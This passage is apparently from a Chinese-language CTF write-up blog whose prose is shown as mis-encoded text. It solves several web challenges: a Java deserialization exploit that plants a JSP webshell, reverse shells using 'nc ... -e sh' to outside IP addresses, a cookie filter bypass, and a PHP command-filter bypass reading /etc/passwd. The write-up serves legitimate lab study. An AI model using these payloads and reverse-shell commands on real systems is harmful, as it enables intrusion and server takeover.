class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;CookieFilter&quot;,</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-meta">@Order(Integer.MAX_VALUE)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CookieFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CookieFilter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> CookieUtil.getCookieValue((HttpServletRequest)servletRequest, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != token &amp;&amp; token != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>            token = URLDecoder.decode(token, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            token = token.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;+&quot;</span>);<br>            <span class="hljs-type">byte</span>[] base = Base64.getDecoder().decode(token.getBytes(StandardCharsets.UTF_8));<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(base));<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User)objectInputStream.readObject();<br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != user &amp;&amp; user.getUsername().equals(<span class="hljs-string">&quot;admin&quot;</span>)) &#123;<br>                    servletRequest.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var9) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;guest&quot;</span>);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            objectOutputStream.writeObject(user);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cookieToken</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>            cookieToken = URLEncoder.encode(cookieToken, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            CookieUtil.setCookie((HttpServletRequest)servletRequest, (HttpServletResponse)servletResponse, <span class="hljs-string">&quot;token&quot;</span>, cookieToken);<br>        &#125;<br><br>        filterChain.doFilter(servletRequest, servletResponse);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ååºåˆ—åŒ–åçš„é‚£ä¸ªå¼ºè½¬æ²¡å•¥å½±å“ï¼Œè¿˜æ˜¯å…ˆåºåˆ—åŒ–ä¸€ä¸ªæ¶æ„çš„<code>Config</code>ç±»åºåˆ—åŒ–åä¼ ç»™<code>token</code>ï¼Œå†ååºåˆ—åŒ–å³å¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.setArgs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;%=Runtime.getRuntime().exec(request.getParameter(new String(new byte[]&#123;97&#125;)))%&gt;&#x27;&gt;/usr/local/tomcat/webapps/ROOT/1.jsp&quot;</span>&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(config);<br><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>        objectOutputStream.close();<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//rO0ABXNyACFjbGFzc2VzLmNvbS5jdGZzaG93LmVudGl0eS5Db25maWcAAAAAAAAAAQIABFsABGFyZ3N0ABNbTGphdmEvbGFuZy9TdHJpbmc7TAAHZXhlY3V0ZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABG5hbWVxAH4AAkwABHBhdGhxAH4AAnhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAXWVjaG8gJzwlPVJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIobmV3IFN0cmluZyhuZXcgYnl0ZVtdezk3fSkpKSU+Jz4xLmpzcHB0AABxAH4ACQ==</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œtokenå†™è¿‡å»ä¼šæŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ç±»å‹è½¬æ¢å‡ºäº†é—®é¢˜ï¼Œä½†å¯¹æˆ‘ä»¬è§£é¢˜æ²¡å•¥å½±å“ï¼š</p><p><img src="/img/843_1.png" alt="843_1"></p><p>ç„¶å<code>1.jsp?a=nc 43.132.254.165 9001 -e sh</code>å³å¯ã€‚ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œæˆ‘ä¸çŸ¥é“ä»–è¿™ä¸ªå½“å‰è¿è¡Œç›®å½•<code>/usr/local/tomcat/webapps/ROOT/</code>æ˜¯æ€ä¹ˆæ‹¿çš„ï¼Œä½†å¦‚æœç›´æ¥<code>&gt;1.jsp</code>è¿˜è¡Œä¸é€šã€‚ã€‚ã€‚</p><p>ä¸Šé¢æ˜¯wpçš„è§£æ³•ï¼Œå…¶å®ä¹Ÿä¸ç”¨è¿™ä¹ˆéº»çƒ¦ï¼Œæ—¢ç„¶éƒ½èƒ½æ‰§è¡Œå‘½ä»¤äº†ç›´æ¥åœ¨<code>ConfigTest</code>åå¼¹shellå°±è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctfshow.entity;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>();<br>        config.setArgs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;nc 43.129.97.84 9001 -e sh&quot;</span>&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(config);<br><br>        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));<br>        objectOutputStream.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="844"><a href="#844" class="headerlink" title="844"></a>844</h2><p>ç»™äº†ä¸ª<code>web.war</code>æ–‡ä»¶ï¼Œè¿™ä¸œè¥¿ç›´æ¥è§£å‹å°±èƒ½æ‹¿<code>META-INF</code>å’Œ<code>WEB-INF</code>ï¼Œæ‰“å¼€çœ‹çœ‹ï¼š</p><p><code>IndexController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;,</span><br><span class="hljs-meta">        produces = &#123;&quot;text/html;charset=utf-8&quot;&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();<br>        modelAndView.setViewName(<span class="hljs-string">&quot;index&quot;</span>);<br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/goPage&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.GET&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">goPage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Map&lt;String, String&gt; param)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> (String)param.get(<span class="hljs-string">&quot;url&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> (String)param.get(<span class="hljs-string">&quot;port&quot;</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != url &amp;&amp; <span class="hljs-literal">null</span> != param &amp;&amp; !param.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(url, Integer.valueOf(port));<br>                <span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(socket.getInputStream(), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>                Map.Entry p;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">Iterator</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> param.entrySet().iterator(); var9.hasNext(); request = request + (String)p.getKey() + (String)p.getValue() + <span class="hljs-string">&quot;\r\n&quot;</span>) &#123;<br>                    p = (Map.Entry)var9.next();<br>                &#125;<br><br>                out.write(request.getBytes());<br><br>                String line;<br>                <span class="hljs-keyword">while</span>((line = in.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    result = result + line;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>                var11.printStackTrace();<br>                result = <span class="hljs-string">&quot;request error&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-string">&quot;url error&quot;</span>;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/src</span><br><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><br><span class="hljs-comment"># Initialize Sanic application</span><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><br><span class="hljs-comment"># Initialize session middleware</span><br>Session(app)<br><br><span class="hljs-comment"># Dummy class used for dynamic attribute assignment</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># Serve the index.html page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> html.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read()<br><br><br><span class="hljs-comment"># Login route</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">request</span>):<br>    user = request.cookies.get(<span class="hljs-string">&quot;user&quot;</span>)<br>    <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> user.lower() == <span class="hljs-string">&#x27;adm;n&#x27;</span>:  <span class="hljs-comment"># Check if user cookie is &#x27;adm;n&#x27;</span><br>        request.ctx.session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-literal">True</span>  <span class="hljs-comment"># Set &#x27;admin&#x27; session variable</span><br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login success&quot;</span>)<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;login fail&quot;</span>)<br><br><br><span class="hljs-comment"># Route to serve the source code of this script</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-comment"># Admin route</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/admin&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-comment"># Check if the user has admin session</span><br>    <span class="hljs-keyword">if</span> request.ctx.session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            data = request.json<br>            key = data.get(<span class="hljs-string">&#x27;key&#x27;</span>)<br>            value = data.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(key, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br>                pollute = Pollute()<br>                pydash.set_(pollute, key, value)  <span class="hljs-comment"># Set key-value pair in pollute object</span><br>                <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Exception in admin route: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;error&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;forbidden&quot;</span>)<br><br><br><span class="hljs-comment"># Run the Sanic application</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>å…ˆçœ‹<code>/login</code>è·¯ç”±ï¼š</p><p><img src="/img/sanic_1.png" alt="sanic_1"></p><p>ä»–ä¼šæŠŠ<code>cookie</code>å­—æ®µä¸­<code>user</code>å¯¹åº”çš„å€¼è½¬æˆå°å†™ä¹‹åå’Œ<code>adm;n</code>æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰ä¼šæŠŠè¯·æ±‚ä¼šè¯ä¸­<code>admin</code>çš„å€¼è®¾ä¸º<code>True</code>ï¼Œè¿™é‡Œå› ä¸ºæœ‰ä¸ªåˆ†å·æ‰€ä»¥ç»™<code>user</code>å­—æ®µèµ‹å€¼çš„æ—¶å€™ä¸èƒ½ç›´æ¥èµ‹æˆåˆ†å·ã€‚</p><p>ä¸€å¼€å§‹ä»¥ä¸ºé—®é¢˜å‡ºåœ¨<code>lower</code>è¿™ä¸ªæ–¹æ³•ä¸Šäº†ï¼Œä»¥ä¸ºä»€ä¹ˆç‰¹æ®Šå­—ç¬¦<code>lower</code>åç›´æ¥å˜æˆåˆ†å·äº†ã€‚æ£é¼“äº†åŠå¤©æ²¡å¼„å‡ºæ¥ï¼Œçœ‹äº†å…¶å®ƒå¸ˆå‚…çš„wpæ‰çŸ¥é“è¿™é‡Œç”¨ä¸ªå…«è¿›åˆ¶ç¼–ç å°±è¡Œï¼š</p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">å‚è€ƒæ–‡ç« </a></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;adm\073n&quot;</span><br></code></pre></td></tr></table></figure><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>dd</code>å’Œ<code>hexdump</code>æ²¡è¢«banï¼Œè¿™ä¸¤ä¸ªéƒ½èƒ½è¯»<code>/etc/passwd</code>ï¼š</p><p><code>cmd=dd if=/etc/passwd</code>(æ³¨æ„å€’æ•°ç¬¬äºŒä¸ª<code>mysql</code>ç”¨æˆ·)</p><p><img src="/img/simple_php_1.png" alt="simple_php_1"></p><p><code>cmd=hexdump /etc/passwd</code></p><p><img src="/img/simple_php_2.png" alt="simple_php_2"></p><p><code>mysql --version</code>å¯ä»¥ç¡®è®¤å­˜åœ¨æ•°æ®åº“æœåŠ¡ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> Ver <span class="hljs-number">15</span>.<span class="hljs-number">1</span> Distrib <span class="hljs-number">10</span>.<span class="hljs-number">4</span>.<span class="hljs-number">13</span>-MariaDB, for Linux (x86_64) using readline <span class="hljs-number">5</span>.<br></code></pre></td></tr></table></figure><p>å¼±å£ä»¤ç”¨æˆ·å <code>root</code> å¯†ç  <code>root</code>ï¼Œ è¿æ¥åˆ° MySQL æ•°æ®åº“ã€‚å¯¼å‡ºæ‰€æœ‰æ•°æ®åº“çš„å†…å®¹ç„¶åå—¯æœ<code>flag</code>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 